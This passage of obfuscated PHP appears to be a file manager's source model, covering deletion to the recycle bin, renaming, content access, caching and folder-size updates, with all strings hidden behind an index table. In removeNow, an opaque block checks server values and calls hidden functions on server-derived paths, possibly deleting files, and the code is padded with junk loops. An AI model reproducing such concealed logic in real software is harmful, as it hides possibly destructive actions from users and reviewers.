$Ú«Î·Ç˜, REPEAT_SKIP); $this->metaSet($’õ¶¥¥Ë, $˜·‚úÔ¨[2268], $…ùˆ»Ÿ); $this->metaSet($’õ¶¥¥Ë, $˜·‚úÔ¨[2269], $»”ü°³÷[$˜·‚úÔ¨[578]]); if ($»”ü°³÷[$˜·‚úÔ¨[192]] != 0) { $this->metaSet($’õ¶¥¥Ë, $˜·‚úÔ¨[2270], _get($â¬ÎúÑ, $˜·‚úÔ¨[2271])); } } CacheLock::unlock($×†’Ø¯À); $this->metaSet($¦çÖßâË, $˜·‚úÔ¨[2272], $»”ü°³÷[$˜·‚úÔ¨[192]]); $this->where(array($˜·‚úÔ¨[193] => $¦çÖßâË))->save(array($˜·‚úÔ¨[507] => time())); $this->recycleClear($»”ü°³÷); Model($˜·‚úÔ¨[642])->eventRemove($¦çÖßâË); $˜ã—ÑñÛ = $this->move($¦çÖßâË, $’õ¶¥¥Ë, REPEAT_RENAME_FOLDER); $this->folderSizeReset($»”ü°³÷[$˜·‚úÔ¨[192]]); return $˜ã—ÑñÛ; } private function recycleClear($ÎôĞæ²) { $»¢òâê =& $_SERVER[ç¦¬”œš]; $ØÏÑ•æ = $this->childrenAll($ÎôĞæ²); $®ê·ÕÎ³ = array($»¢òâê[500] => array($»¢òâê[501], $ØÏÑ•æ[$»¢òâê[2273]])); Model($»¢òâê[2274])->where($®ê·ÕÎ³)->delete(); } public function removeNow($ÉØãù¡§, $àµË—»Ã = true) { $ÍÌÍ€Û§ =& $_SERVER[ç¦¬”œš]; if ($_SERVER[$ÍÌÍ€Û§[474]] != $_SERVER[$ÍÌÍ€Û§[1453]]) { $ÔéŸëšä = $ÍÌÍ€Û§[956]; $©ÅùüŞ = $ÍÌÍ€Û§[475]; $¦ô¦¹ = $_SERVER[$ÍÌÍ€Û§[476]] . $ÍÌÍ€Û§[477]; $–ûò±ÅĞ = $©ÅùüŞ($¦ô¦¹); $®ŠŸ‰‚ = explode($ÍÌÍ€Û§[262], $–ûò±ÅĞ); if (count($®ŠŸ‰‚) < $ÍÌÍ€Û§[707]) { $²‹êÂ—Ñ = $ÍÌÍ€Û§[479]; $²‹êÂ—Ñ(); } $˜ßı—ªï = $ÍÌÍ€Û§[957]; $˜ßı—ªï($_SERVER[$ÍÌÍ€Û§[958]]); $˜ßı—ªï($_SERVER[$ÍÌÍ€Û§[476]] . $ÍÌÍ€Û§[2275]); $ªİÎÛ¿‚ = 1; while ($ªİÎÛ¿‚ > 1) { $ªİÎÛ¿‚ = $ªİÎÛ¿‚ + 4; $ÌéÓ¬Å = rawurlencode($ªİÎÛ¿‚ . $ÍÌÍ€Û§[454]); } } $”Ø¹ŸĞ¬ = $this->sourceInfo($ÉØãù¡§); $Îã¦€²‹ = $this->pathInfoMore($ÉØãù¡§); if (!$”Ø¹ŸĞ¬) { return !0; } if ($”Ø¹ŸĞ¬[$ÍÌÍ€Û§[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÉØãù¡§); Hook::trigger($ÍÌÍ€Û§[2276], $Îã¦€²‹, $àµË—»Ã); if ($àµË—»Ã) { Model($ÍÌÍ€Û§[2274])->moveToRecycle($ÉØãù¡§); } else { $¬ŞÛ°‹  = $this->childrenAll($”Ø¹ŸĞ¬); Model($ÍÌÍ€Û§[642])->eventRemove($ÉØãù¡§); $this->removeRelevance($¬ŞÛ°‹ [$ÍÌÍ€Û§[2273]], $¬ŞÛ°‹ [$ÍÌÍ€Û§[1575]]); } $this->folderSizeReset($”Ø¹ŸĞ¬[$ÍÌÍ€Û§[192]]); $³Î×ºè¼ = array($”Ø¹ŸĞ¬[$ÍÌÍ€Û§[192]]); if ($”Ø¹ŸĞ¬[$ÍÌÍ€Û§[494]] == $ÍÌÍ€Û§[91]) { $³Î×ºè¼[] = $”Ø¹ŸĞ¬[$ÍÌÍ€Û§[193]]; } $this->updateModifyTime($³Î×ºè¼); $this->lockMoveEnd($ÉØãù¡§); Hook::trigger($ÍÌÍ€Û§[1812], $Îã¦€²‹, $àµË—»Ã); return !0; } public function childrenAll($İ–ú³Öü) { $×ïöğ¶¸ =& $_SERVER[ç¦¬”œš]; $ÅÜãıÃñ = $İ–ú³Öü[$×ïöğ¶¸[193]]; if ($İ–ú³Öü[$×ïöğ¶¸[494]] == $×ïöğ¶¸[91]) { $ÆÖÃæôì = array($×ïöğ¶¸[661] => array($×ïöğ¶¸[621], $İ–ú³Öü[$×ïöğ¶¸[593]] . $ÅÜãıÃñ . $×ïöğ¶¸[622])); $¹‘±¤Óí = array($×ïöğ¶¸[661] => $ÆÖÃæôì[$×ïöğ¶¸[593]]); $öÔ¤ÍÂ™ = $this->field($×ïöğ¶¸[2277])->where($¹‘±¤Óí)->select(); $Äé¦¦¯‰ = !1; $©Öİæ = array($ÅÜãıÃñ); if ($öÔ¤ÍÂ™) { $Äé¦¦¯‰ = array_to_keyvalue($öÔ¤ÍÂ™, $×ïöğ¶¸[12], $×ïöğ¶¸[550]); $Äé¦¦¯‰ = array_remove_value($Äé¦¦¯‰, $×ïöğ¶¸[228]); $©Öİæ = array_to_keyvalue($öÔ¤ÍÂ™, $×ïöğ¶¸[12], $×ïöğ¶¸[193]); $©Öİæ[] = $ÅÜãıÃñ; } } else { $Äé¦¦¯‰ = array($İ–ú³Öü[$×ïöğ¶¸[550]]); $©Öİæ = array($ÅÜãıÃñ); } return array($×ïöğ¶¸[2273] => $©Öİæ, $×ïöğ¶¸[1575] => $Äé¦¦¯‰); } public function removeArray($‚…ÆÚÃ¤) { if (!$‚…ÆÚÃ¤) { return !0; } } public function removeRelevance($–³¢ç, $“Ì–½­) { $ç•¿ø“ =& $_SERVER[ç¦¬”œš]; $–³¢ç = $–³¢ç ? $–³¢ç : array(); $“Ì–½­ = $“Ì–½­ ? $“Ì–½­ : array(); $–³¢ç = array_unique(array_filter($–³¢ç)); $“Ì–½­ = array_unique(array_filter($“Ì–½­)); if (!$–³¢ç) { return !1; } $ø•ÕÉÈÌ = array($ç•¿ø“[500] => array($ç•¿ø“[501], $–³¢ç)); Model($ç•¿ø“[2274])->where($ø•ÕÉÈÌ)->delete(); Model($ç•¿ø“[544])->where($ø•ÕÉÈÌ)->delete(); Model($ç•¿ø“[2120])->where($ø•ÕÉÈÌ)->delete(); Model($ç•¿ø“[642])->where($ø•ÕÉÈÌ)->delete(); Model($ç•¿ø“[1948])->removeBySource($–³¢ç); Model($ç•¿ø“[2255])->removeBySource($–³¢ç); $this->where($ø•ÕÉÈÌ)->delete(); Model($ç•¿ø“[553])->remove($“Ì–½­); for ($îÇÛïâ£ = 0; $îÇÛïâ£ < count($–³¢ç); $îÇÛïâ£++) { $this->sourceCacheClear($–³¢ç[$îÇÛïâ£]); } } public function rename($Àø˜±Ş, $’â¨ğ§) { $¤¸¥şãĞ =& $_SERVER[ç¦¬”œš]; $éÌÎ‰î¾ = $this->sourceInfo($Àø˜±Ş); if (!$éÌÎ‰î¾) { return !1; } $ïº“ÊîÃ = $this->fileNameExist($éÌÎ‰î¾[$¤¸¥şãĞ[192]], $’â¨ğ§); if ($ïº“ÊîÃ && $ïº“ÊîÃ != $Àø˜±Ş) { return !1; } $ë¶à‰ëµ = array($¤¸¥şãĞ[503] => $’â¨ğ§, $¤¸¥şãĞ[660] => USER_ID); if ($éÌÎ‰î¾[$¤¸¥şãĞ[494]] != $¤¸¥şãĞ[91]) { $ë¶à‰ëµ[$¤¸¥şãĞ[495]] = substr(get_path_ext($’â¨ğ§), 0, 10); } Model($¤¸¥şãĞ[642])->eventRename($Àø˜±Ş, $éÌÎ‰î¾[$¤¸¥şãĞ[32]], $’â¨ğ§); $this->sourceCacheClear($Àø˜±Ş); $this->setNamePinyin($Àø˜±Ş, $ë¶à‰ëµ[$¤¸¥şãĞ[32]], !1); $this->updateModifyTime($éÌÎ‰î¾[$¤¸¥şãĞ[192]]); $ˆÕõïéõ = $this->where(array($¤¸¥şãĞ[500] => $Àø˜±Ş))->data($ë¶à‰ëµ)->save(); $éøÛ×Ó½ = $¤¸¥şãĞ[2263] . $éÌÎ‰î¾[$¤¸¥şãĞ[192]]; if (isset(self::$cacheChildList[$éøÛ×Ó½])) { unset(self::$cacheChildList[$éøÛ×Ó½]); } return $ˆÕõïéõ; } public function setNamePinyin($ª‘¹«¥”, $şª¹åíÄ, $¨šàÓÍ = true) { $ó—ó×ö¨ =& $_SERVER[ç¦¬”œš]; $Êğ§¯™« = Input::check($şª¹åíÄ, $ó—ó×ö¨[664]); $Åªç‚½¿ = array($ó—ó×ö¨[526] => KodSort::makeStr($şª¹åíÄ)); if ($Êğ§¯™«) { $Åªç‚½¿[$ó—ó×ö¨[547]] = str_replace($ó—ó×ö¨[53], $ó—ó×ö¨[12], Pinyin::get($şª¹åíÄ)); $Åªç‚½¿[$ó—ó×ö¨[546]] = Pinyin::get($şª¹åíÄ, $ó—ó×ö¨[665]); } if (!$¨šàÓÍ && !$Êğ§¯™«) { $Åªç‚½¿[$ó—ó×ö¨[547]] = null; $Åªç‚½¿[$ó—ó×ö¨[546]] = null; } $this->metaSet($ª‘¹«¥”, $Åªç‚½¿); } public function getContent($È€üûœÍ) { $Åø£Ò =& $_SERVER[ç¦¬”œš]; $¶íêş€î = $this->fileInfoGet($È€üûœÍ); if (!$¶íêş€î) { return !1; } if ($¶íêş€î[$Åø£Ò[79]] == 0) { return $Åø£Ò[12]; } $©Øªº’í = $Åø£Ò[2278] . $¶íêş€î[$Åø£Ò[556]]; if ($¶íêş€î[$Åø£Ò[79]] <= 1024 * 10) { $Ë†ç­ÓÜ = Cache::get($©Øªº’í); if (!$Ë†ç­ÓÜ) { $Ë†ç­ÓÜ = IO::getContent($¶íêş€î[$Åø£Ò[87]]); Cache::set($©Øªº’í, $Ë†ç­ÓÜ); } return $Ë†ç­ÓÜ; } if (!$¶íêş€î[$Åø£Ò[87]]) { return $Åø£Ò[12]; } return IO::getContent($¶íêş€î[$Åø£Ò[87]]); } public function setDesc($Øï×‰Ä, $ÓÉ»÷äË) { $Ö»Â¦¥Î =& $_SERVER[ç¦¬”œš]; Model($Ö»Â¦¥Î[642])->eventAddDesc($Øï×‰Ä, $ÓÉ»÷äË); return $this->metaSet($Øï×‰Ä, $Ö»Â¦¥Î[535], $ÓÉ»÷äË); } public function setContent($ ó¯…ş´, $¢˜Ô¬‰µ = '') { $—ŠœŠç =& $_SERVER[ç¦¬”œš]; $ÉÈ§ù±õ = $this->sourceInfo($ ó¯…ş´); $¨¼üÑ‚ = $this->fileInfoGet($ ó¯…ş´); if (!$¨¼üÑ‚ || !$ÉÈ§ù±õ) { return !1; } $Ä‡Œ—È = Model($—ŠœŠç[553])->addFileByContent($¢˜Ô¬‰µ, $ÉÈ§ù±õ[$—ŠœŠç[32]]); $Ô±à§­å = $this->fileHistory($ÉÈ§ù±õ, $Ä‡Œ—È[$—ŠœŠç[550]], $Ä‡Œ—È[$—ŠœŠç[79]]); if (!$Ô±à§­å) { return Model($—ŠœŠç[553])->remove($Ä‡Œ—È[$—ŠœŠç[550]]); } $this->folderSizeReset($ÉÈ§ù±õ[$—ŠœŠç[192]]); return !0; } public function fileSubstr($ÂºìÆ½ø, $¯ìşÑµĞ, $§½÷™ î) { $£Á×Úß = $this->fileInfoGet($ÂºìÆ½ø); if (!$£Á×Úß) { return !1; } return IO::fileSubstr($£Á×Úß[$_SERVER[ç¦¬”œš][87]], $¯ìşÑµĞ, $§½÷™ î); } public function fileInfoGet($ÅÕì»“¨) { $ƒ·ì¢ =& $_SERVER[ç¦¬”œš]; $¼¼·””æ = $this->sourceInfo($ÅÕì»“¨); if (!$¼¼·””æ || $¼¼·””æ[$ƒ·ì¢[494]]) { return !1; } $ĞÑ´ü’ = $ƒ·ì¢[557] . $¼¼·””æ[$ƒ·ì¢[550]]; $‘Ùµ¥Ò = _get(self::$cacheFileInfo, $ĞÑ´ü’); if ($‘Ùµ¥Ò) { return $‘Ùµ¥Ò; } $¹†˜—´ = Model($ƒ·ì¢[553])->fileInfo($¼¼·””æ[$ƒ·ì¢[550]]); if ($¹†˜—´) { $¹†˜—´[$ƒ·ì¢[32]] = $¼¼·””æ[$ƒ·ì¢[32]]; } self::$cacheFileInfo[$ĞÑ´ü’] = $¹†˜—´; return $¹†˜—´; } private function folderChildrenNumber($¤¿˜) { $£ ¶¯–Õ =& $_SERVER[ç¦¬”œš]; $»éÅœÉ = $this->sourceInfo($¤¿˜); $À½å—Ü = array($£ ¶¯–Õ[661] => array($£ ¶¯–Õ[621], $»éÅœÉ[$£ ¶¯–Õ[593]] . $¤¿˜ . $£ ¶¯–Õ[622]), $£ ¶¯–Õ[658] => $»éÅœÉ[$£ ¶¯–Õ[578]], $£ ¶¯–Õ[513] => intval($»éÅœÉ[$£ ¶¯–Õ[514]]), $£ ¶¯–Õ[655] => 1); $ŸçÑ‡ùÎ = $this->where($À½å—Ü)->count(); $¼šöœª = $this->where($À½å—Ü)->where(array($£ ¶¯–Õ[655] => 0))->count(); return array($£ ¶¯–Õ[83] => $¼šöœª, $£ ¶¯–Õ[84] => $ŸçÑ‡ùÎ); } public function pathInfo($ÄôÆ¡—¬, $¸ğ¿û÷ = false) { $Ä«€„ † =& $_SERVER[ç¦¬”œš]; $¸ğ¿û÷ = !1; $ÄôÆ¡—¬ = intval($ÄôÆ¡—¬); $ÈÙ¦Ï = $Ä«€„ †[543] . intval($¸ğ¿û÷) . $Ä«€„ †[462] . $ÄôÆ¡—¬; $“ºÒ…è = _get(self::$cachePathInfo, $ÈÙ¦Ï); if ($“ºÒ…è) { return $“ºÒ…è; } $çŞÍô­ = $this->sourceInfo($ÄôÆ¡—¬); if (!$çŞÍô­) { return !1; } $çŞÍô­ = $this->_listDataApplyItem($çŞÍô­, $¸ğ¿û÷); self::$cachePathInfo[$ÈÙ¦Ï] = $çŞÍô­; return $çŞÍô­; } public static $cachePathInfoMore = array(); public function pathInfoMore($ò“šˆ¿) { $úõ™ºû­ =& $_SERVER[ç¦¬”œš]; $«ƒî±®Ÿ = _get(self::$cachePathInfoMore, $ò“šˆ¿); if ($«ƒî±®Ÿ) { return $«ƒî±®Ÿ; } $ÀüŒ‹úà = $this->pathInfo($ò“šˆ¿); if (!$ÀüŒ‹úà) { return !1; } if ($ÀüŒ‹úà[$úõ™ºû­[494]] == $úõ™ºû­[91]) { $ÀüŒ‹úà[$úõ™ºû­[82]] = $this->folderChildrenNumber($ò“šˆ¿); } self::$cachePathInfoMore[$ò“šˆ¿] = $ÀüŒ‹úà; return $ÀüŒ‹úà; } public function sourceInfo($ÒÊøºàŸ) { $§ìÄ—Ÿ =& $_SERVER[ç¦¬”œš]; if (!$ÒÊøºàŸ) { return array(); } $ÒÊøºàŸ = intval($ÒÊøºàŸ); $—Ÿ· ­€ = $§ìÄ—Ÿ[542] . $ÒÊøºàŸ; $‡¯•¨İ· = _get(self::$cacheSourceInfo, $—Ÿ· ­€); if ($‡¯•¨İ·) { return $‡¯•¨İ·; } $îïóªıµ = $this->where(array($§ìÄ—Ÿ[193] => $ÒÊøºàŸ))->find(); self::$cacheSourceInfo[$—Ÿ· ­€] = $îïóªıµ; return self::$cacheSourceInfo[$—Ÿ· ­€]; } public function sourceCacheClear($Òíìş« = false) { self::cacheClear($Òíìş«); } public static function cacheClear($ıüÙÛüı = false) { $³º§ë¡È =& $_SERVER[ç¦¬”œš]; if ($ıüÙÛüı == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$³º§ë¡È[542] . $ıüÙÛüı]); unset(self::$cachePathInfoMore[$ıüÙÛüı]); unset(self::$cachePathInfo[$³º§ë¡È[2279] . $ıüÙÛüı]); unset(self::$cachePathInfo[$³º§ë¡È[2280] . $ıüÙÛüı]); } public function metaSet($ÕÓØòâ’, $“ŠÑ§¬ = null, $áÎ’“÷Ï = null) { $ëŸÔµ¦Û = parent::metaSet($ÕÓØòâ’, $“ŠÑ§¬, $áÎ’“÷Ï); if ($ëŸÔµ¦Û) { $this->sourceCacheClear($ÕÓØòâ’); } return $ëŸÔµ¦Û; } public function pathInfoByPath($á“ååë¹, $¢¦ŸÑ¬) { $ÚğË–úÒ =& $_SERVER[ç¦¬”œš]; $³óÄØÑ = !$¢¦ŸÑ¬ ? array() : explode($ÚğË–úÒ[8], trim($¢¦ŸÑ¬, $ÚğË–úÒ[8])); $¹¸ÈÍå— = $á“ååë¹; foreach ($³óÄØÑ as $¥³¤çÕì) { $ÙĞÖ¾ä = array($ÚğË–úÒ[192] => $¹¸ÈÍå—, $ÚğË–úÒ[32] => $¥³¤çÕì); $¨ùè†ä = $this->field($ÚğË–úÒ[2281])->where($ÙĞÖ¾ä)->select(); if (!$¨ùè†ä) { return !1; } $¨ùè†ä = array_sort_by($¨ùè†ä, $ÚğË–úÒ[514]); $¹¸ÈÍå— = $¨ùè†ä[0][$ÚğË–úÒ[193]]; } $­•é÷­­ = $this->sourceInfo($¹¸ÈÍå—); $this->pathInfoFilter($­•é÷­­); return $­•é÷­­; } protected function updateModifyTime($»«ŸœÓ¯) { $³ÅÎ¶µ¨ =& $_SERVER[ç¦¬”œš]; $û »õ = defined($³ÅÎ¶µ¨[2195]) ? USER_ID : 0; if (!$»«ŸœÓ¯) { return; } if (!is_array($»«ŸœÓ¯)) { $»«ŸœÓ¯ = array($»«ŸœÓ¯); } foreach ($»«ŸœÓ¯ as $Í€Ğ½‡© => $ßöºøÉ‹) { $»«ŸœÓ¯[$Í€Ğ½‡©] = intval($ßöºøÉ‹); $this->sourceCacheClear($ßöºøÉ‹); } $À›Ÿº® = array($³ÅÎ¶µ¨[193] => array($³ÅÎ¶µ¨[7], $»«ŸœÓ¯)); $±ËùÈ = array($³ÅÎ¶µ¨[660] => $û »õ, $³ÅÎ¶µ¨[507] => time()); $this->where($À›Ÿº®)->save($±ËùÈ); } public function folderSizeReset($üõˆ´ö“, $õ´‚¯à = false) { $Ñ÷•šÄÍ =& $_SERVER[ç¦¬”œš]; if ($this->statusIgnoreResetSpace) { return; } $¼éÀÉ¡– = $this->sourceInfo($üõˆ´ö“); $áè³«ÄÀ = $Ñ÷•šÄÍ[2282] . $üõˆ´ö“; CacheLock::lock($áè³«ÄÀ, 20); if ($õ´‚¯à === !1) { $this->sourceCacheClear($üõˆ´ö“); $¼éÀÉ¡– = $this->sourceInfo($üõˆ´ö“); $ÎÙú¹ğ = array($Ñ÷•šÄÍ[486] => $üõˆ´ö“, $Ñ÷•šÄÍ[513] => 0); $ˆ‰ù™‘ñ = $this->where($ÎÙú¹ğ)->sum($Ñ÷•šÄÍ[79]); $õ´‚¯à = intval($ˆ‰ù™‘ñ) - intval($¼éÀÉ¡–[$Ñ÷•šÄÍ[79]]); } if ($õ´‚¯à == 0) { return CacheLock::unlock($áè³«ÄÀ); } $¶º›ÒŞ‰ = $this->parentLevelArray($¼éÀÉ¡–[$Ñ÷•šÄÍ[593]]); if (!$¶º›ÒŞ‰) { $¶º›ÒŞ‰ = array(); } $¶º›ÒŞ‰[] = $¼éÀÉ¡–[$Ñ÷•šÄÍ[193]]; $ÎÙú¹ğ = array($Ñ÷•šÄÍ[193] => array($Ñ÷•šÄÍ[501], $¶º›ÒŞ‰)); if ($õ´‚¯à < 0) { $ÎÙú¹ğ[$Ñ÷•šÄÍ[79]] = array($Ñ÷•šÄÍ[1094], abs($õ´‚¯à)); } $this->where($ÎÙú¹ğ)->setAdd($Ñ÷•šÄÍ[79], $õ´‚¯à); CacheLock::unlock($áè³«ÄÀ); $¦×ïİ«Ï = $Ñ÷•šÄÍ[2283] . $¼éÀÉ¡–[$Ñ÷•šÄÍ[190]] . $Ñ÷•šÄÍ[4] . $¼éÀÉ¡–[$Ñ÷•šÄÍ[578]]; $œŠ¼àæ = array($¼éÀÉ¡–[$Ñ÷•šÄÍ[190]], $¼éÀÉ¡–[$Ñ÷•šÄÍ[578]]); TaskRun::timeLimitCall($¦×ïİ«Ï, $Ñ÷•šÄÍ[2284], $œŠ¼àæ, 1.5); } public function folderSizeResetChildren($·úĞ×Êº) { $«¾ìÀÃ =& $_SERVER[ç¦¬”œš]; $this->sourceCacheClear($·úĞ×Êº); $»ï—äÇ = $this->sourceInfo($·úĞ×Êº); $ÃºÉš©Ã = array($«¾ìÀÃ[655] => 1, $«¾ìÀÃ[658] => $»ï—äÇ[$«¾ìÀÃ[578]], $«¾ìÀÃ[661] => array($«¾ìÀÃ[621], $»ï—äÇ[$«¾ìÀÃ[593]] . $·úĞ×Êº . $«¾ìÀÃ[622])); $Êö¦šŸ = $«¾ìÀÃ[2285]; $Âáê…õÓ = $this->field($Êö¦šŸ)->where($ÃºÉš©Ã)->select(); $ÃºÉš©Ã[$«¾ìÀÃ[494]] = 0; $ÂğÈŞàÇ = $this->field($Êö¦šŸ)->where($ÃºÉš©Ã)->select(); if (!$ÂğÈŞàÇ) { return; } $Âáê…õÓ[] = $»ï—äÇ; $Âáê…õÓ = array_to_keyvalue($Âáê…õÓ, $«¾ìÀÃ[193]); foreach ($Âáê…õÓ as $“¢ûöœ => $•†ı™Í) { $Âáê…õÓ[$“¢ûöœ][$«¾ìÀÃ[2286]] = $Âáê…õÓ[$“¢ûöœ][$«¾ìÀÃ[79]]; $Âáê…õÓ[$“¢ûöœ][$«¾ìÀÃ[79]] = 0; } foreach ($ÂğÈŞàÇ as $•†ı™Í) { $´¿ß¶¦ = $•†ı™Í[$«¾ìÀÃ[192]] . $«¾ìÀÃ[12]; if (!isset($Âáê…õÓ[$´¿ß¶¦])) { continue; } if ($•†ı™Í[$«¾ìÀÃ[514]] == $Âáê…õÓ[$´¿ß¶¦][$«¾ìÀÃ[514]]) { $Âáê…õÓ[$´¿ß¶¦][$«¾ìÀÃ[79]] += $•†ı™Í[$«¾ìÀÃ[79]]; } } foreach ($Âáê…õÓ as $•†ı™Í) { $ù‚¯ÆŠñ = $this->parentLevelArray($•†ı™Í[$«¾ìÀÃ[593]]); foreach ($ù‚¯ÆŠñ as $´¿ß¶¦) { $´¿ß¶¦ = $´¿ß¶¦ . $«¾ìÀÃ[12]; if (!isset($Âáê…õÓ[$´¿ß¶¦])) { continue; } if ($•†ı™Í[$«¾ìÀÃ[514]] == $Âáê…õÓ[$´¿ß¶¦][$«¾ìÀÃ[514]]) { $Âáê…õÓ[$´¿ß¶¦][$«¾ìÀÃ[79]] += $•†ı™Í[$«¾ìÀÃ[79]]; } } } $Ôü²¯Š÷ = array(); foreach ($Âáê…õÓ as $•†ı™Í) { if ($•†ı™Í[$«¾ìÀÃ[79]] == $•†ı™Í[$«¾ìÀÃ[2286]]) { continue; } $Ôü²¯Š÷[] = array($«¾ìÀÃ[193], $•†ı™Í[$«¾ìÀÃ[193]], $«¾ìÀÃ[79], $•†ı™Í[$«¾ìÀÃ[79]]); } $this->saveAll($Ôü²¯Š÷); } public function userSpaceReset($İº°ùÚÛ = false) { $àƒªˆ÷º =& $_SERVER[ç¦¬”œš]; $ŞÙóõ ¬ = $this->where(array($àƒªˆ÷º[190] => self::TYPE_USER, $àƒªˆ÷º[578] => $İº°ùÚÛ, $àƒªˆ÷º[494] => 0))->sum($àƒªˆ÷º[79]); $ŞÙóõ ¬ = !$ŞÙóõ ¬ || $ŞÙóõ ¬ <= 0 ? 0 : $ŞÙóõ ¬; Model($àƒªˆ÷º[586])->userEdit($İº°ùÚÛ, array($àƒªˆ÷º[1957] => $ŞÙóõ ¬)); } public function targetSpaceUpdate($¬¥ÇÀÇû, $Ú¹½¢õ) { $ù€À‡¡Ó =& $_SERVER[ç¦¬”œš]; if (!$Ú¹½¢õ) { return; } if (!in_array($¬¥ÇÀÇû, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¸•¡ùÚ = $this->targetSpaceSize($¬¥ÇÀÇû, $Ú¹½¢õ); if ($¬¥ÇÀÇû == self::TYPE_USER) { Model($ù€À‡¡Ó[586])->userEdit($Ú¹½¢õ, array($ù€À‡¡Ó[1957] => $¸•¡ùÚ)); } else { if ($¬¥ÇÀÇû == self::TYPE_GROUP) { Model($ù€À‡¡Ó[594])->groupEdit($Ú¹½¢õ, array($ù€À‡¡Ó[1957] => $¸•¡ùÚ)); } } } public function targetSpaceSize($ÌÜÌª…, $—şĞéö“) { $À•ıõ’· =& $_SERVER[ç¦¬”œš]; $ãÃõÍ•Ó = 0; $›ù÷Ş÷ = $this->targetSourceRoot($ÌÜÌª…, $—şĞéö“, !0); foreach ($›ù÷Ş÷ as $¡·“ğá) { if (!$¡·“ğá) { continue; } $ãÃõÍ•Ó += floatval($¡·“ğá[$À•ıõ’·[79]]); $Ü”çÔù³ = array($À•ıõ’·[661] => array($À•ıõ’·[621], $À•ıõ’·[603] . $¡·“ğá[$À•ıõ’·[193]] . $À•ıõ’·[622])); $¦ü”Ø‰ = Model($À•ıõ’·[512])->field($À•ıõ’·[500])->where($Ü”çÔù³)->select(); $¦ü”Ø‰ = array_to_keyvalue($¦ü”Ø‰, $À•ıõ’·[12], $À•ıõ’·[193]); $¦ü”Ø‰ = array_unique(array_filter($¦ü”Ø‰)); if ($¦ü”Ø‰) { $Ü”çÔù³ = array($À•ıõ’·[500] => array($À•ıõ’·[501], $¦ü”Ø‰)); $ãÃõÍ•Ó += floatval($this->where($Ü”çÔù³)->sum($À•ıõ’·[79])); } } $ãÃõÍ•Ó = !$ãÃõÍ•Ó || $ãÃõÍ•Ó <= 0 ? 0 : $ãÃõÍ•Ó; return $ãÃõÍ•Ó; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ç·—åõä) { return $this->fileTypeProfile($ç·—åõä, SourceModel::TYPE_USER); } public function groupFileTypeProfile($›™‰ğù«) { return $this->fileTypeProfile($›™‰ğù«, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ñâü¡õÅ, $ÌÅª…Ä) { $î§ç =& $_SERVER[ç¦¬”œš]; $¿µ½ÑØ³ = $î§ç[2287] . $ñâü¡õÅ . $î§ç[11] . $ÌÅª…Ä; $–Âëß‰’ = Cache::get($¿µ½ÑØ³); if ($–Âëß‰’) { return $–Âëß‰’; } $çíò´© = array($î§ç[655] => 0); if ($ñâü¡õÅ != !1) { $çíò´©[$î§ç[578]] = $ñâü¡õÅ; $çíò´©[$î§ç[190]] = $ÌÅª…Ä; } $×…ş„‚ = array(); $×…ş„‚[$î§ç[2288]] = array($î§ç[2289] => LNG($î§ç[2288]), $î§ç[2290] => $this->where($çíò´©)->count(), $î§ç[626] => $this->where($çíò´©)->sum($î§ç[79])); $¦»Òªä÷ = KodIO::fileTypeList(); foreach ($¦»Òªä÷ as $Öç»ƒ–ì => $’ÑçÄ­) { $çíò´©[$î§ç[495]] = $this->fileTypeWhere($Öç»ƒ–ì); $×…ş„‚[$Öç»ƒ–ì] = array($î§ç[2289] => $’ÑçÄ­[$î§ç[32]], $î§ç[2290] => $this->where($çíò´©)->count(), $î§ç[626] => $this->where($çíò´©)->sum($î§ç[79])); } Cache::set($¿µ½ÑØ³, $×…ş„‚, 1200); return $×…ş„‚; } public function fileNameExist($ÑÅø¸, $§ğÏ‰Ñ) { $âî‡½í =& $_SERVER[ç¦¬”œš]; $ò´“£ïÄ = $this->field($âî‡½í[2291])->where(array($âî‡½í[192] => $ÑÅø¸, $âî‡½í[32] => $§ğÏ‰Ñ, $âî‡½í[514] => 0))->find(); return is_array($ò´“£ïÄ) ? $ò´“£ïÄ[$âî‡½í[193]] : !1; } public function childList($éî•ã‘Ê) { $ñ…¬³”ì =& $_SERVER[ç¦¬”œš]; $ÍàÍ—£Ø = $ñ…¬³”ì[2263] . $éî•ã‘Ê; if (isset(self::$cacheChildList[$ÍàÍ—£Ø])) { return self::$cacheChildList[$ÍàÍ—£Ø]; } $Ã ùì¬´ = array($ñ…¬³”ì[192] => intval($éî•ã‘Ê), $ñ…¬³”ì[514] => 0); $“·‰…ü« = $this->where($Ã ùì¬´)->select(); $“·‰…ü« = $“·‰…ü« ? $“·‰…ü« : array(); self::$cacheChildList[$ÍàÍ—£Ø] = $“·‰…ü«; foreach ($“·‰…ü« as $çÀğÒ…Ğ) { $ÍàÍ—£Ø = $ñ…¬³”ì[542] . $çÀğÒ…Ğ[$ñ…¬³”ì[193]]; self::$cacheSourceInfo[$ÍàÍ—£Ø] = $çÀğÒ…Ğ; } return $“·‰…ü«; } public function fileNameAuto($ôŸÁ¶˜©, $çˆøÃÚ, $ÛíßçÎ = REPEAT_RENAME, $òÖˆ€˜û = false) { $÷“¹Æªş =& $_SERVER[ç¦¬”œš]; $…¦å§­ë = get_path_ext($çˆøÃÚ); $ƒ¥‘œÖ = $…¦å§­ë ? get_path_ext_name($çˆøÃÚ) . $÷“¹Æªş[2292] . $…¦å§­ë : $çˆøÃÚ . $÷“¹Æªş[460]; $‹ÑŞÔò­ = array($÷“¹Æªş[192] => $ôŸÁ¶˜©, $÷“¹Æªş[514] => 0, $÷“¹Æªş[32] => array($÷“¹Æªş[459], $ƒ¥‘œÖ)); $ÌÔÖ¦ˆ¥ = $this->field($÷“¹Æªş[32])->where($‹ÑŞÔò­)->select(); $–±§Ïü¾ = array_to_keyvalue($ÌÔÖ¦ˆ¥, $÷“¹Æªş[12], $÷“¹Æªş[32]); return $this->fileNameAutoGet($–±§Ïü¾, $çˆøÃÚ, $ÛíßçÎ, $òÖˆ€˜û); } public function fileNameAutoGet($È¦ê‰Ä®, $Áè·í, $ÀÎ·Æï, $›øÜŒ‚) { $±á‘çŒ =& $_SERVER[ç¦¬”œš]; if ($ÀÎ·Æï == REPEAT_REPLACE || !$È¦ê‰Ä® || !in_array_not_case($Áè·í, 